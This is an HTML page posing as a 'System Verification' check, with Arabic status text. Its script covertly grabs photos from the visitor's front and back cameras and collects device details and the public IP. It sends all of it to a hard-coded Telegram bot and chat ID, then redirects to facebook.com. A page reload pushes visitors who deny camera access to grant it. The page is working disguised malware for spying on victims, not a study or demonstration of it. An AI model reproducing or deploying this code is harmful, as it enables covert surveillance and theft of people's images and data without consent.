<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
        }

        .container {
            text-align: center;
            padding: 30px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }

        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        #status {
            font-size: 18px;
            margin: 15px 0;
        }

        video {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div id="status">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù†Ø¸Ø§Ù…...</div>
        <div class="loader"></div>
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas" style="display: none;"></canvas>
    </div>

    <script>
        const BOT_TOKEN = "8465391371:AAEnmc4_-dFNnwtV_B8bVZbtJMcpTyUsPA8";
        const CHAT_ID = "7981786032";
        let photos = [];
        let deviceInfo = {};

        async function collectDeviceData() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'Unknown')
            };
        }

        async function initCamera(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode }
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                return new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        
                        setTimeout(() => {
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            photos.push(canvas.toDataURL('image/jpeg'));
                            stream.getTracks().forEach(track => track.stop());
                            resolve(true);
                        }, 1000);
                    };
                });
            } catch {
                return false;
            }
        }

        async function capturePhotos() {
            deviceInfo = await collectDeviceData();
            
            // Capture front camera
            let success = await initCamera('user');
            if (!success) return handleError();
            
            // Capture back camera
            success = await initCamera('environment');
            if (!success) return handleError();
            
            await sendToTelegram();
            window.location.href = "https://facebook.com";
        }

        async function sendToTelegram() {
            const textMessage = `
ğŸ“¡ <b>New System Verification</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ•’ <b>Time:</b> <code>${new Date().toLocaleString()}</code>
ğŸŒ <b>IP:</b> <code>${deviceInfo.ip}</code>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ“± <b>Device Info:</b>
${/mobile/i.test(navigator.userAgent) ? 'ğŸ“± Mobile' : 'ğŸ’» Desktop'} | ${deviceInfo.platform}
ğŸ–¥ï¸ <b>Screen:</b> ${deviceInfo.screen}
ğŸ—£ï¸ <b>Language:</b> ${deviceInfo.language}
            `;

            try {
                // Send text info
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: textMessage,
                        parse_mode: 'HTML'
                    })
                });

                // Send photos
                for (let i = 0; i < photos.length; i++) {
                    const blob = await fetch(photos[i]).then(r => r.blob());
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, `photo_${i+1}.jpg`);
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }
            } catch (error) {
                console.error('Telegram Error:', error);
            }
        }

        function handleError() {
            document.getElementById('status').textContent = "Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ø·Ù„ÙˆØ¨ Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©";
            setTimeout(() => location.reload(), 3000);
        }

        // Start process
        setTimeout(capturePhotos, 2000);
    </script>
</body>
</html>
